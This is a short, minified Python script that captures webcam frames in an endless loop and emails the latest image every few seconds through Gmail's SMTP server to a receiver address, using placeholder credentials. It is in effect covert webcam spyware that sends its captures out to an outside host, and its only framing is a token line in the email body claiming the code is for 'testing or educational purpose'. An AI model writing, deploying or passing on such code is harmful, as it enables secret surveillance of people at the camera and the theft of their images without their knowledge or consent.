G='pic.jpg'
import cv2 as B,time,smtplib as H,imghdr as I
from email.message import EmailMessage as J
D=B.VideoCapture(0)
while True:
	for Q in range(0,100):R,K=D.read();B.imwrite(G,K)
	time.sleep(5);E='<sender mail>';L='<reciever mail>';M='<sender password>';A=J();A['Subject']='Webcam image';A['From']=E;A['To']=L;A.set_content('Use it for testing or educational purpose ! ')
	with open(G,'rb')as C:N=C.read();O=I.what(C.name);P=C.name
	A.add_attachment(N,maintype='image',subtype=O,filename=P)
	with H.SMTP_SSL('smtp.gmail.com',465)as F:F.login(E,M);F.send_message(A)
D.release()
B.destroyAllWindows()
